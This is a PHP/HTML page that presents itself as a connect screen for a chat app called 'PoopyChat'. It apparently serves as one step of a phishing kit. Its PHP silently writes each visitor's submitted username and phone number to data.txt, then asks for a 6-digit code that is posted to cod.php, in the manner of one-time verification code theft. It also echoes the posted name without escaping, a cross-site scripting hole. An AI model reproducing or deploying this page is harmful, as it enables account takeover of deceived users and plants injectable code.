<?php
file_put_contents("data.txt", "\nUsername: " . $_POST['name'] . "\nNumber: " . $_POST['number'] . "\n", FILE_APPEND);
$name=$_POST['name'];
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="style.css" type="text/css" media="all" />
  <title>PoopyChat</title>
</head>
<style>

.server{text-align:center; padding: 10px;}
#codf{text-align:center;}
.ginhj{
position: fixed;
bottom: 10px;
left: 10px;
 right: 10px;
}
</style>

<body>
<div class="server">
<br>
<form action="cod.php" method="POST">
<h4 style="font-weight: 700; letter-spacing: -1px;">Poopychat</h4>
<p style="opacity: 0.4; font-size: 14px; font-weight: 500;">version: 99.23.13.2.0</p>
<p style="opacity:0.4; font-size: 14px; font-weight: 600;">Enter the 6-digit code to connect to poopychat</p>
<input type="text" id="codf" name="cod" placeholder="XXX - XXX"/>
<br><br><br><br>
<h3>We're almost there, <span style="color: #3193e4"> <?php echo $name ?></span></h3>
<div class="ginhj">
<button type="submit" style="width: 100%; font-size: 20px; margin:0;" class="share"><h4>Connect</h4></button>
</div>
</form>
</div>
</body>
</html>
